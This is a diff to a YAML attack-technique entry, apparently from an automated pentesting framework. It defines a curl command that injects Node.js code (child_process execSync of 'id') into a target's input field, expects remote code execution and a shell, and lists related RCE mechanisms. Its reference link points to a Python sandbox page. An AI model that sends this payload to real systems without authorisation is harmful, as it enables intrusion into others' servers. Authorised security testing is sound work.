@@ -2,15 +2,20 @@ name: rce_node
 category: web
 description: Node.js RCE techniques
 preconditions:
-  - service.port==80
+- service.port==80
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "curl -s '{target_url}' -d 'input=require("child_process").execSync("id").toString()'"
-parser: null
+command_template: 'curl -s ''{target_url}'' -d ''input=require("child_process").execSync("id").toString()''
+
+  '
+parser: web_response_parser
 expected_effects:
-  - action_completed
+- rce_achieved
+- shell_obtained
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "Node.js RCE: eval() injection, require() injection, prototype pollution → RCE, template injection (Pug/EJS/Nunjucks), deserialization (node-serialize)."
+mechanism: "Node.js RCE: eval() injection, require() injection, prototype pollution\
+  \ \u2192 RCE, template injection (Pug/EJS/Nunjucks), deserialization (node-serialize)."
+hacktricks_ref: generic-methodologies-and-resources/python/bypass-python-sandboxes/README.md
